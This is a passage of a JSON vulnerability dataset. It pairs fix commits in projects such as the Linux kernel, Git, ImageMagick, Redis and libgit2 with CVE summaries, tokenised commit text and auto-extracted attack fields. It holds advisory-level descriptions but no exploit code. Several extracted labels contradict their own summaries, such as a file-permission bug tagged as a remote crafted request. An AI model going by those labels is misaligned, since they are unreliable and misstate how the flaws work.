Cause":"caused by corrupted DDS files","Attack Type":"remote attacker"},{"commit_id":"f106eee10038c2ee5b6056aaf3f6d5229be6dcdd","cve_id":"CVE-2010-5328","cwe_id":"CWE-20","commit_message":"pids: fix fork_idle() to setup ->pids correctly\n\ncopy_process(pid => &init_struct_pid) doesn't do attach_pid\/etc.\n\nIt shouldn't, but this means that the idle threads run with the wrong\npids copied from the caller's task_struct. In x86 case the caller is\neither kernel_init() thread or keventd.\n\nIn particular, this means that after the series of cpu_up\/cpu_down an\nidle thread (which never exits) can run with .pid pointing to nowhere.\n\nChange fork_idle() to initialize idle->pids[] correctly. We only set\n.pid = &init_struct_pid but do not add .node to list, INIT_TASK() does\nthe same for the boot-cpu idle thread (swapper).\n\nSigned-off-by: Oleg Nesterov <oleg@redhat.com>\nCc: Cedric Le Goater <clg@fr.ibm.com>\nCc: Dave Hansen <haveblue@us.ibm.com>\nCc: Eric Biederman <ebiederm@xmission.com>\nCc: Herbert Poetzl <herbert@13thfloor.at>\nCc: Mathias Krause <Mathias.Krause@secunet.com>\nAcked-by: Roland McGrath <roland@redhat.com>\nAcked-by: Serge Hallyn <serue@us.ibm.com>\nCc: Sukadev Bhattiprolu <sukadev@us.ibm.com>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"include\/linux\/init_task.h in the Linux kernel before 2.6.35 does not prevent signals with a process group ID of zero from reaching the swapper process, which allows local users to cause a denial of service (system crash) by leveraging access to this process group.","commit_message_1":"fix fork_idle ( ) to setup - > pid correctly copy_process ( pid = > & init_struct_pid ) doe n't do attach_pid\/etc","Vulnerability Type":"Improper Input Validation","Attack Vector":"by leveraging access to this process group .","Impact":"cause a denial of service ( system crash )","Root Cause":"does not prevent signals with a process group id of zero from reaching the swapper process","Attack Type":"local attacker"},{"commit_id":"f9d69eadd2b16b00d1a1f9f286122123f8e547dd","cve_id":"CVE-2018-1000041","cwe_id":null,"commit_message":"Fixed possible credentials leaking reported by Alex Birsan.","summary":"GNOME librsvg version before commit c6ddf2ed4d768fd88adbea2b63f575cd523022ea contains a Improper input validation vulnerability in rsvg-io.c that can result in the victim's Windows username and NTLM password hash being leaked to remote attackers through SMB. This attack appear to be exploitable via The victim must process a specially crafted SVG file containing an UNC path on Windows.","commit_message_1":"fixed possible credential leaking reported by alex birsan","Vulnerability Type":"unspecified","Attack Vector":"By persuading a victim to open a specially crafted SVG file containing an UNC path on Windows","Impact":"obtain sensitive information","Root Cause":"caused by improper validation of user-supplied input by rsvg-io.c","Attack Type":"remote attacker"},{"commit_id":"5241e4d7b177d0b6f073cfc9ed5444bf51ec89d6","cve_id":"CVE-2018-19045","cwe_id":"CWE-200","commit_message":"Fix compile warning introduced in commit c6247a9\n\nCommit c6247a9 - \"Add command line and configuration option to set umask\"\nintroduced a compile warning, although the code would have worked OK.\n\nSigned-off-by: Quentin Armitage <quentin@armitage.org.uk>","summary":"keepalived 2.0.8 used mode 0666 when creating new temporary files upon a call to PrintData or PrintStats, potentially leaking sensitive information.","commit_message_1":"fix compile warning introduced in commit c6247a9 commit c6247a9 - `` add command line and configuration option to set umask '' introduced a compile warning , although the code would have worked ok","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"By sending a specially-crafted request","Impact":"obtain sensitive information","Root Cause":"caused by the use of used mode 0666 to create new temporary files when making PrintData or PrintStats function calls","Attack Type":"remote attacker"},{"commit_id":"2a3f93459d689d990b3ecfbe782fec89b97d3279","cve_id":"CVE-2018-18021","cwe_id":"CWE-20","commit_message":"arm64: KVM: Sanitize PSTATE.M when being set from userspace\n\nNot all execution modes are valid for a guest, and some of them\ndepend on what the HW actually supports. Let's verify that what\nuserspace provides is compatible with both the VM settings and\nthe HW capabilities.\n\nCc: <stable@vger.kernel.org>\nFixes: 0d854a60b1d7 (\"arm64: KVM: enable initialization of a 32bit vcpu\")\nReviewed-by: Christoffer Dall <christoffer.dall@arm.com>\nReviewed-by: Mark Rutland <mark.rutland@arm.com>\nReviewed-by: Dave Martin <Dave.Martin@arm.com>\nSigned-off-by: Marc Zyngier <marc.zyngier@arm.com>\nSigned-off-by: Will Deacon <will.deacon@arm.com>","summary":"arch\/arm64\/kvm\/guest.c in KVM in the Linux kernel before 4.18.12 on the arm64 platform mishandles the KVM_SET_ON_REG ioctl. This is exploitable by attackers who can create virtual machines. An attacker can arbitrarily redirect the hypervisor flow of control (with full register control). An attacker can also cause a denial of service (hypervisor panic) via an illegal exception return. This occurs because of insufficient restrictions on userspace access to the core register file, and because PSTATE.M validation does not prevent unintended execution modes.","commit_message_1":"kvm : sanitize <file> when being set from userspace not all execution mode are valid for a guest , and some of them depend on what the hw actually support","Vulnerability Type":"Improper Input Validation","Attack Vector":"By sending a specially-crafted request","Impact":"cause a denial of service","Root Cause":"caused by improper input validation by the KVM_SET_ON_REG ioctl call","Attack Type":"local attacker"},{"commit_id":"1a7fd1fb2998002da6e9ff2ee46e1bdd25ee8404","cve_id":"CVE-2018-17456","cwe_id":"CWE-20","commit_message":"fsck: detect submodule paths starting with dash\n\nAs with urls, submodule paths with dashes are ignored by\ngit, but may end up confusing older versions. Detecting them\nvia fsck lets us prevent modern versions of git from being a\nvector to spread broken .gitmodules to older versions.\n\nCompared to blocking leading-dash urls, though, this\ndetection may be less of a good idea:\n\n  1. While such paths provide confusing and broken results,\n     they don't seem to actually work as option injections\n     against anything except \"cd\". In particular, the\n     submodule code seems to canonicalize to an absolute\n     path before running \"git clone\" (so it passes\n     \/your\/clone\/-sub).\n\n  2. It's more likely that we may one day make such names\n     actually work correctly. Even after we revert this fsck\n     check, it will continue to be a hassle until hosting\n     servers are all updated.\n\nOn the other hand, it's not entirely clear that the behavior\nin older versions is safe. And if we do want to eventually\nallow this, we may end up doing so with a special syntax\nanyway (e.g., writing \".\/-sub\" in the .gitmodules file, and\nteaching the submodule code to canonicalize it when\ncomparing).\n\nSo on balance, this is probably a good protection.\n\nSigned-off-by: Jeff King <peff@peff.net>\nSigned-off-by: Junio C Hamano <gitster@pobox.com>","summary":"Git before 2.14.5, 2.15.x before 2.15.3, 2.16.x before 2.16.5, 2.17.x before 2.17.2, 2.18.x before 2.18.1, and 2.19.x before 2.19.1 allows remote code execution during processing of a recursive *git clone* of a superproject if a .gitmodules file has a URL field beginning with a '-' character.","commit_message_1":"detect submodule path starting with dash a with url , submodule path with dash are ignored by git , but may end up confusing older version","Vulnerability Type":"Improper Input Validation","Attack Vector":"By using a specially-crafted file","Impact":"execute arbitrary code","Root Cause":"caused by a flaw during processing of a recursive \"git clone\" of a superproject","Attack Type":"remote attacker"},{"commit_id":"16916c8979c32765c542e216b31cee2671b7afe7","cve_id":"CVE-2018-16644","cwe_id":"CWE-20","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/1269","summary":"There is a missing check for length in the functions ReadDCMImage of coders\/dcm.c and ReadPICTImage of coders\/pict.c in ImageMagick 7.0.8-11, which allows remote attackers to cause a denial of service via a crafted image.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted image","Impact":"cause a denial of service","Root Cause":"caused by a missing check for length","Attack Type":"remote attacker"},{"commit_id":"a7bfbd93812950b7444841431e8e297e62cb524e","cve_id":"CVE-2018-14055","cwe_id":"CWE-20","commit_message":"Don't let attackers inject rogue values into znc.conf\n\nBecause of this vulnerability, existing ZNC users could get Admin\npermissions.\n\nThanks for Jeriko One <jeriko.one@gmx.us> for finding and reporting this.","summary":"ZNC before 1.7.1-rc1 does not properly validate untrusted lines coming from the network, allowing a non-admin user to escalate his privilege and inject rogue values into znc.conf.","commit_message_1":"do n't let attacker inject rogue value into <file> because of this vulnerability , existing znc user could get admin permission","Vulnerability Type":"Improper Input Validation","Attack Vector":"has an unknown attack vector","Impact":"escalate his privilege and inject rogue values into znc . conf","Root Cause":"does not properly validate untrusted lines coming from the network","Attack Type":"remote attacker"},{"commit_id":"b35530fa0681b27eba084de5527037ebfb397422","cve_id":"CVE-2018-11377","cwe_id":"CWE-125","commit_message":"Fix oobread in avr","summary":"The avr_op_analyze() function in radare2 2.5.0 allows remote attackers to cause a denial of service (heap-based out-of-bounds read and application crash) via a crafted binary file.","commit_message_1":"fix oobread in avr","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted binary file","Impact":"cause a denial of service ( heap - based out - of - bounds read and application crash )","Root Cause":"caused by a heap-based out-of-bounds read","Attack Type":"remote attacker"},{"commit_id":"1eb08bcd4634ae42ec45e8284923ac048beaa4c3","cve_id":"CVE-2018-11219","cwe_id":"CWE-190","commit_message":"Security: update Lua struct package for security.\n\nDuring an auditing Apple found that the \"struct\" Lua package\nwe ship with Redis (http:\/\/www.inf.puc-rio.br\/~roberto\/struct\/) contains\na security problem. A bound-checking statement fails because of integer\noverflow. The bug exists since we initially integrated this package with\nLua, when scripting was introduced, so every version of Redis with\nEVAL\/EVALSHA capabilities exposed is affected.\n\nInstead of just fixing the bug, the library was updated to the latest\nversion shipped by the author.","summary":"An Integer Overflow issue was discovered in the struct library in the Lua subsystem in Redis before 3.2.12, 4.x before 4.0.10, and 5.x before 5.0 RC2, leading to a failure of bounds checking.","commit_message_1":"update lua struct package for security","Vulnerability Type":"integer overflow","Attack Vector":"By sending an overly long argument","Impact":"overflow a buffer and execute arbitrary code on the system","Root Cause":"caused by an integer overflow","Attack Type":"remote attacker"},{"commit_id":"52a00201fca331217c3b4b8b634f6a0f57d6b7d3","cve_id":"CVE-2018-11218","cwe_id":"CWE-119","commit_message":"Security: fix Lua cmsgpack library stack overflow.\n\nDuring an auditing effort, the Apple Vulnerability Research team discovered\na critical Redis security issue affecting the Lua scripting part of Redis.\n\n-- Description of the problem\n\nSeveral years ago I merged a pull request including many small changes at\nthe Lua MsgPack library (that originally I authored myself). The Pull\nRequest entered Redis in commit 90b6337c1, in 2014.\nUnfortunately one of the changes included a variadic Lua function that\nlacked the check for the available Lua C stack. As a result, calling the\n\"pack\" MsgPack library function with a large number of arguments, results\ninto pushing into the Lua C stack a number of new values proportional to\nthe number of arguments the function was called with. The pushed values,\nmoreover, are controlled by untrusted user input.\n\nThis in turn causes stack smashing which we believe to be exploitable,\nwhile not very deterministic, but it is likely that an exploit could be\ncreated targeting specific versions of Redis executables. However at its\nminimum the issue results in a DoS, crashing the Redis server.\n\n-- Versions affected\n\nVersions greater or equal to Redis 2.8.18 are affected.\n\n-- Reproducing\n\nReproduce with this (based on the original reproduction script by\nApple security team):\n\nhttps:\/\/gist.github.com\/antirez\/82445fcbea6d9b19f97014cc6cc79f8a\n\n-- Verification of the fix\n\nThe fix was tested in the following way:\n\n1) I checked that the problem is no longer observable running the trigger.\n2) The Lua code was analyzed to understand the stack semantics, and that\nactually enough stack is allocated in all the cases of mp_pack() calls.\n3) The mp_pack() function was modified in order to show exactly what items\nin the stack were being set, to make sure that there is no silent overflow\neven after the fix.\n\n-- Credits\n\nThank you to the Apple team and to the other persons that helped me\nchecking the patch and coordinating this communication.","summary":"Memory Corruption was discovered in the cmsgpack library in the Lua subsystem in Redis before 3.2.12, 4.x before 4.0.10, and 5.x before 5.0 RC2 because of stack-based buffer overflows.","commit_message_1":"fix lua cmsgpack library stack overflow","Vulnerability Type":"buffer overflow","Attack Vector":"because of stack-based buffer overflows","Impact":"overflow a buffer and cause the application to crash","Root Cause":"caused by improper bounds checking by the cmsgpack library","Attack Type":"remote attacker"},{"commit_id":"3f461902dc1072acb8b7607ee65d0a0458ffac2a","cve_id":"CVE-2018-10887","cwe_id":"CWE-125","commit_message":"delta: fix sign-extension of big left-shift\n\nOur delta code was originally adapted from JGit, which itself adapted it\nfrom git itself. Due to this heritage, we inherited a bug from git.git\nin how we compute the delta offset, which was fixed upstream in\n48fb7deb5 (Fix big left-shifts of unsigned char, 2009-06-17). As\nexplained by Linus:\n\n    Shifting 'unsigned char' or 'unsigned short' left can result in sign\n    extension errors, since the C integer promotion rules means that the\n    unsigned char\/short will get implicitly promoted to a signed 'int' due to\n    the shift (or due to other operations).\n\n    This normally doesn't matter, but if you shift things up sufficiently, it\n    will now set the sign bit in 'int', and a subsequent cast to a bigger type\n    (eg 'long' or 'unsigned long') will now sign-extend the value despite the\n    original expression being unsigned.\n\n    One example of this would be something like\n\n            unsigned long size;\n            unsigned char c;\n\n            size += c << 24;\n\n    where despite all the variables being unsigned, 'c << 24' ends up being a\n    signed entity, and will get sign-extended when then doing the addition in\n    an 'unsigned long' type.\n\n    Since git uses 'unsigned char' pointers extensively, we actually have this\n    bug in a couple of places.\n\nIn our delta code, we inherited such a bogus shift when computing the\noffset at which the delta base is to be found. Due to the sign extension\nwe can end up with an offset where all the bits are set. This can allow\nan arbitrary memory read, as the addition in `base_len < off + len` can\nnow overflow if `off` has all its bits set.\n\nFix the issue by casting the result of `*delta++ << 24UL` to an unsigned\ninteger again. Add a test with a crafted delta that would actually\nsucceed with an out-of-bounds read in case where the cast wouldn't\nexist.\n\nReported-by: Riccardo Schirone <rschiron@redhat.com>\nTest-provided-by: Riccardo Schirone <rschiron@redhat.com>","summary":"A flaw was found in libgit2 before version 0.27.3. It has been discovered that an unexpected sign extension in git_delta_apply function in delta.c file may lead to an integer overflow which in turn leads to an out of bound read, allowing to read before the base object. An attacker may use this flaw to leak memory addresses or cause a Denial of Service.","commit_message_1":"fix sign-extension of big left-shift our delta code wa originally adapted from jgit , which itself adapted it from git itself","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by an integer overflow","Attack Type":"remote attacker"},{"commit_id":"5224a7544c95552553e2e6be0b4a789956a6464e","cve_id":"CVE-2018-9989","cwe_id":"CWE-125","commit_message":"Prevent arithmetic overflow on bounds check","summary":"ARM mbed TLS before 2.1.11, before 2.7.2, and before 2.8.0 has a buffer over-read in ssl_parse_server_psk_hint() that could cause a crash on invalid input.","commit_message_1":"prevent arithmetic overflow on bound check","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially-crafted request","Impact":"cause a denial of service","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"027f84c69f4ef30c0693832a6c396ef19e563ca1","cve_id":"CVE-2018-9988","cwe_id":"CWE-119","commit_message":"Prevent arithmetic overflow on bounds check","summary":"ARM mbed TLS before 2.1.11, before 2.7.2, and before 2.8.0 has a buffer over-read in ssl_parse_server_key_exchange() that could cause a crash on invalid input.","commit_message_1":"prevent arithmetic overflow on bound check","Vulnerability Type":"buffer overflow","Attack Vector":"By sending a specially-crafted request","Impact":"cause a denial of service","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"3db1af1f370295ad5355b8f64b865a2a357bcac0","cve_id":"CVE-2018-8098","cwe_id":"CWE-190","commit_message":"index: error out on unreasonable prefix-compressed path lengths\n\nWhen computing the complete path length from the encoded\nprefix-compressed path, we end up just allocating the complete path\nwithout ever checking what the encoded path length actually is. This can\neasily lead to a denial of service by just encoding an unreasonable long\npath name inside of the index. Git already enforces a maximum path\nlength of 4096 bytes. As we also have that enforcement ready in some\nplaces, just make sure that the resulting path is smaller than\nGIT_PATH_MAX.\n\nReported-by: Krishna Ram Prakash R <krp@gtux.in>\nReported-by: Vivek Parikh <viv0411.parikh@gmail.com>","summary":"Integer overflow in the index.c:read_entry() function while decompressing a compressed prefix length in libgit2 before v0.26.2 allows an attacker to cause a denial of service (out-of-bounds read) via a crafted repository index file.","commit_message_1":"error out on unreasonable prefix-compressed path length when computing the complete path length from the encoded prefix-compressed path , we end up just allocating the complete path without ever checking what the encoded path length actually is","Vulnerability Type":"integer overflow","Attack Vector":"via a crafted repository index file ","Impact":"cause a denial of service ( out - of - bounds read )","Root Cause":"caused by an integer overflow","Attack Type":"remote attacker"},{"commit_id":"251e22abde21833b3d29577e4d8c7aaccd650eee","cve_id":"CVE-2017-18174","cwe_id":"CWE-415","commit_message":"pinctrl: amd: Use devm_pinctrl_register() for pinctrl registration\n\nUse devm_pinctrl_register() for pin control registration and clean\nerror path.\n\nSigned-off-by: Laxman Dewangan <ldewangan@nvidia.com>\nSigned-off-by: Linus Walleij <linus.walleij@linaro.org>","summary":"In the Linux kernel before 4.7, the amd_gpio_remove function in drivers\/pinctrl\/pinctrl-amd.c calls the pinctrl_unregister function, leading to a double free.","commit_message_1":"amd : use devm_pinctrl_register ( ) for pinctrl registration use devm_pinctrl_register ( ) for pin control registration and clean error path","Vulnerability Type":"double free","Attack Vector":"By calling the pinctrl_unregister function","Impact":"cause a denial of service","Root Cause":"caused by a double free flaw","Attack Type":"remote attacker"},{"commit_id":"f2d3be2a8741234faaa96f5fd05fdfdc75779a79","cve_id":"CVE-2017-7500","cwe_id":"CWE-59","commit_message":"Restrict following symlinks to directories by ownership (CVE-2017-7500)\n\nOnly follow directory symlinks owned by target directory owner or root.\nThis prevents privilege escalation from user-writable directories via\ndirectory symlinks to privileged directories on package upgrade, while\nstill allowing admin to arrange disk usage with symlinks.\n\nThe rationale is that if you can create symlinks owned by user X you *are*\nuser X (or root), and if you also own directory Y you can do whatever with\nit already, including change permissions. So when you create a symlink to\nthat directory, the link ownership acts as a simple stamp of authority that\nyou indeed want rpm to treat this symlink as it were the directory that\nyou own. Such a permission can only be given by you or root, which\nis just the way we want it. Plus it's almost ridiculously simple as far\nas rules go, compared to trying to calculate something from the\nsource vs destination directory permissions etc.\n\nIn the normal case, the user arranging diskspace with symlinks is indeed\nroot so nothing changes, the only real change here is to links created by\nnon-privileged users which should be few and far between in practise.\nUnfortunately our test-suite runs as a regular user via fakechroot and\nthus the testcase for this fails under the new rules. Adjust the testcase\nto get the ownership straight and add a second case for the illegal\nbehavior, basically the same as the old one but with different expectations.","summary":"It was found that rpm did not properly handle RPM installations when a destination path was a symbolic link to a directory, possibly changing ownership and permissions of an arbitrary directory, and RPM files being placed in an arbitrary destination. An attacker, with write access to a directory in which a subdirectory will be installed, could redirect that directory to an arbitrary location and gain root privilege.","commit_message_1":"restrict following symlinks to directory by ownership ( <cve_id> ) only follow directory symlinks owned by target directory owner or root","Vulnerability Type":"Link Following","Attack Vector":"by creating a symbolic link from a temporary file to directories","Impact":"gain root privileges","Root Cause":"caused by the improper handling of RPM installations when a destination path was a symbolic link to a directory","Attack Type":"local attacker"},{"commit_id":"f25486c3d4aa472fec79150f2c41ed4333395d3d","cve_id":"CVE-2016-9583","cwe_id":"CWE-125","commit_message":"Fixed a bug in the packet iterator code.\nAdded a new regression test case.","summary":"An out-of-bounds heap read vulnerability was found in the jpc_pi_nextpcrl() function of jasper before 2.0.6 when processing crafted input.","commit_message_1":"fixed a bug in the packet iterator code","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By persuading a victim to open a specially-crafted image file","Impact":"cause a denial of service","Root Cause":"caused by an out-of-bounds heap read","Attack Type":"remote attacker"},{"commit_id":"298a43a77ec0ed2c19a8c924ddd8571ef3e65dfd","cve_id":"CVE-2019-16910","cwe_id":"CWE-200","commit_message":"Merge remote-tracking branch 'upstream-restricted\/pr\/549' into mbedtls-2.7-restricted","summary":"Arm Mbed TLS before 2.19.0 and Arm Mbed Crypto before 2.0.0, when deterministic ECDSA is enabled, use an RNG with insufficient entropy for blinding, which might allow an attacker to recover a private key via side-channel attacks if a victim signs the same message many times. (For Mbed TLS, the fix is also available in versions 2.7.12 and 2.16.3.)","commit_message_1":"merge remote-tracking branch 'upstream-restricted\/pr\/<number> ' into mbedtls-<file>-restricted","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via side - channel attacks if a victim signs the same message many times","Impact":"recover a private key","Root Cause":"caused by the use of an RNG with improper entropy for blinding","Attack Type":"remote attacker"},{"commit_id":"5411543a310a470b1257fb93273cdd6e8dfcb3af","cve_id":"CVE-2019-16718","cwe_id":"CWE-78","commit_message":"More fixes for the CVE-2019-14745","summary":"In radare2 before 3.9.0, a command injection vulnerability exists in bin_symbols() in libr\/core\/cbin.c. By using a crafted executable file, it's possible to execute arbitrary shell commands with the permissions of the victim. This vulnerability is due to an insufficient fix for CVE-2019-14745 and improper handling of symbol names embedded in executables.","commit_message_1":"more fix for the <cve_id>","Vulnerability Type":"command injection","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"execute arbitrary commands","Root Cause":"caused by improper handling of symbol names embedded","Attack Type":"remote attacker"},{"commit_id":"afc39bea36fd436e54262f150c009e8d72db5014","cve_id":"CVE-2019-15226","cwe_id":null,"commit_message":"Track byteSize of HeaderMap internally.\n\nIntroduces a cached byte size updated internally in HeaderMap. The value\nis stored as an optional, and is cleared whenever a non-const pointer or\nreference to a HeaderEntry is accessed. The cached value can be set with\nrefreshByteSize() which performs an iteration over the HeaderMap to sum\nthe size of each key and value in the HeaderMap.\n\nSigned-off-by: Asra Ali <asraa@google.com>","summary":"Upon receiving each incoming request header data, Envoy will iterate over existing request headers to verify that the total size of the headers stays below a maximum limit. The implementation in versions 1.10.0 through 1.11.1 for HTTP\/1.x traffic and all versions of Envoy for HTTP\/2 traffic had O(n^2) performance characteristics. A remote attacker may craft a request that stays below the maximum request header size but consists of many thousands of small headers to consume CPU and result in a denial-of-service attack.","commit_message_1":"track bytesize of headermap internally","Vulnerability Type":"unspecified","Attack Vector":"By sending a specially-crafted request which contains many thousands of small headers","Impact":"cause a denial of service","Root Cause":"caused by improper input validation","Attack Type":"remote attacker"},{"commit_id":"87d6bef033062f969e70fa40c43dfd945d5a20ab","cve_id":"CVE-2019-15165","cwe_id":"CWE-20","commit_message":"do sanity checks on PHB header length before allocating memory. There was no fault; but doing the check results in a more consistent error","summary":"sf-pcapng.c in libpcap before 1.9.1 does not properly validate the PHB header length before allocating memory.","commit_message_1":"do sanity check on phb header length before allocating memory","Vulnerability Type":"Improper Input Validation","Attack Vector":"sf-pcapng.c in libpcap before 1.9.1 does not properly validate the PHB header length","Impact":"cause a denial of service","Root Cause":"does not properly validate the phb header length before allocating memory","Attack Type":"remote attacker"},{"commit_id":"a77d8d97f5a7bced0468f0b08798c83fb67427bc","cve_id":"CVE-2019-14981","cwe_id":"CWE-369","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/1552","summary":"In ImageMagick 7.x before 7.0.8-41 and 6.x before 6.9.10-41, there is a divide-by-zero vulnerability in the MeanShiftImage function. It allows an attacker to cause a denial of service by sending a crafted file.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Divide By Zero","Attack Vector":"by sending a crafted file","Impact":"cause a denial of service","Root Cause":"caused by a divide-by-zero vulnerability","Attack Type":"remote attacker"},{"commit_id":"c5d012a46ae22be9444326aa37969a3f75daa3ba","cve_id":"CVE-2019-14980","cwe_id":"CWE-416","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick6\/issues\/43","summary":"In ImageMagick 7.x before 7.0.8-42 and 6.x before 6.9.10-42, there is a use after free vulnerability in the UnmapBlob function that allows an attacker to cause a denial of service by sending a crafted file.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick6\/issues\/<number>","Vulnerability Type":"Use After Free","Attack Vector":"by sending a crafted file","Impact":"cause a denial of service","Root Cause":"caused by a use after free vulnerability","Attack Type":"remote attacker"},{"commit_id":"072684e8c58d17e853f8e8b9f6d9ce2e58d2b036","cve_id":"CVE-2019-14763","cwe_id":"CWE-189","commit_message":"USB: gadget: f_hid: fix deadlock in f_hidg_write()\n\nIn f_hidg_write() the write_spinlock is acquired before calling\nusb_ep_queue() which causes a deadlock when dummy_hcd is being used.\nThis is because dummy_queue() callbacks into f_hidg_req_complete() which\ntries to acquire the same spinlock. This is (part of) the backtrace when\nthe deadlock occurs:\n\n  0xffffffffc06b1410 in f_hidg_req_complete\n  0xffffffffc06a590a in usb_gadget_giveback_request\n  0xffffffffc06cfff2 in dummy_queue\n  0xffffffffc06a4b96 in usb_ep_queue\n  0xffffffffc06b1eb6 in f_hidg_write\n  0xffffffff8127730b in __vfs_write\n  0xffffffff812774d1 in vfs_write\n  0xffffffff81277725 in SYSC_write\n\nFix this by releasing the write_spinlock before calling usb_ep_queue()\n\nReviewed-by: James Bottomley <James.Bottomley@HansenPartnership.com>\nTested-by: James Bottomley <James.Bottomley@HansenPartnership.com>\nCc: stable@vger.kernel.org # 4.11+\nFixes: 749494b6bdbb (\"usb: gadget: f_hid: fix: Move IN request allocation to set_alt()\")\nSigned-off-by: Radoslav Gerganov <rgerganov@vmware.com>\nSigned-off-by: Felipe Balbi <felipe.balbi@linux.intel.com>","summary":"In the Linux kernel before 4.16.4, a double-locking error in drivers\/usb\/dwc3\/gadget.c may potentially cause a deadlock with f_hid.","commit_message_1":"gadget : f_hid : fix deadlock in f_hidg_write ( ) in f_hidg_write ( ) the write_spinlock is acquired before calling usb_ep_queue ( ) which cause a deadlock when dummy_hcd is being used","Vulnerability Type":"Numeric Errors","Attack Vector":"By sending a specially-crafted request","Impact":"cause a denial of service","Root Cause":"caused by a double-locking error","Attack Type":"local attacker"},{"commit_id":"0979ba8d10c96ebca330715bfd4494ea0e019a8f","cve_id":"CVE-2019-14452","cwe_id":"CWE-22","commit_message":"harden plugin unzipping to zip-slip attacks","summary":"Sigil before 0.9.16 is vulnerable to a directory traversal, allowing attackers to write arbitrary files via a ..\/ (dot dot slash) in a ZIP archive entry that is mishandled during extraction.","commit_message_1":"harden plugin unzipping to zip-slip attack","Vulnerability Type":"Path Traversal","Attack Vector":"via a . . \/ ( dot dot slash ) in a zip archive entry that is mishandled during extraction","Impact":"write arbitrary files","Root Cause":"is vulnerable to a directory traversal","Attack Type":"remote attacker"},{"commit_id":"04e2f280cc4a0766bedcc7b9eb56449ceecc2ad4","cve_id":"CVE-2019-14452","cwe_id":"CWE-22","commit_message":"further harden against malicious epubs and produce error message","summary":"Sigil before 0.9.16 is vulnerable to a directory traversal, allowing attackers to write arbitrary files via a ..\/ (dot dot slash) in a ZIP archive entry that is mishandled during extraction.","commit_message_1":"further harden against malicious epubs and produce error message","Vulnerability Type":"Path Traversal","Attack Vector":"via a . . \/ ( dot dot slash ) in a zip archive entry that is mishandled during extraction","Impact":"write arbitrary files","Root Cause":"is vulnerable to a directory traversal","Attack Type":"remote attacker"},{"commit_id":"05beb69ba60acce09f73ed491bb76f332849c3a0","cve_id":"CVE-2019-13615","cwe_id":"CWE-119","commit_message":"Check the max size to read before actually reading\n\nThe size check waas also missing from the length parsing","summary":"libebml before 1.3.6, as used in the MKV module in VideoLAN VLC Media Player binaries before 3.0.3, has a heap-based buffer over-read in EbmlElement::FindNextElement.","commit_message_1":"check the max size to read before actually reading","Vulnerability Type":"buffer overflow","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"has a heap - based buffer over - read","Attack Type":"remote attacker"},{"commit_id":"1ddcf2e4f28029a888cadef2e757509ef5047ad8","cve_id":"CVE-2019-13454","cwe_id":"CWE-369","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/1629","summary":"ImageMagick 7.0.8-54 Q16 allows Division by Zero in RemoveDuplicateLayers in MagickCore\/layer.c.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Divide By Zero","Attack Vector":"By sending a specially-crafted request","Impact":"cause a denial of service","Root Cause":"caused by a divide by zero flaw","Attack Type":"remote attacker"},{"commit_id":"7c2c5ba5b8e3a0b2b82f56c71dfab74ed4006df7","cve_id":"CVE-2019-13391","cwe_id":"CWE-125","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/1588","summary":"In ImageMagick 7.0.8-50 Q16, ComplexImages in MagickCore\/fourier.c has a heap-based buffer over-read because of incorrect calls to GetCacheViewVirtualPixels.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"ComplexImages in MagickCore\/fourier.c","Impact":"cause a denial of service","Root Cause":"has a heap - based buffer over - read because of incorrect calls to getcacheviewvirtualpixels .","Attack Type":"local attacker"},{"commit_id":"4a334bbf5584de37c6f5a47c380a531c8c4b140a","cve_id":"CVE-2019-13311","cwe_id":"CWE-399","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/1623","summary":"ImageMagick 7.0.8-50 Q16 has memory leaks at AcquireMagickMemory because of a wand\/mogrify.c error.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Resource Management Errors","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by memory leaks","Attack Type":"remote attacker"},{"commit_id":"5f21230b657ccd65452dd3d94c5b5401ba691a2d","cve_id":"CVE-2019-13310","cwe_id":"CWE-399","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/1616","summary":"ImageMagick 7.0.8-50 Q16 has memory leaks at AcquireMagickMemory because of an error in MagickWand\/mogrify.c.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Resource Management Errors","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"has memory leaks at acquiremagickmemory because of an error","Attack Type":"remote attacker"},{"commit_id":"61135001a625364e29bdce83832f043eebde7b5a","cve_id":"CVE-2019-13308","cwe_id":"CWE-119","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/1595","summary":"ImageMagick 7.0.8-50 Q16 has a heap-based buffer overflow in MagickCore\/fourier.c in ComplexImage.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability 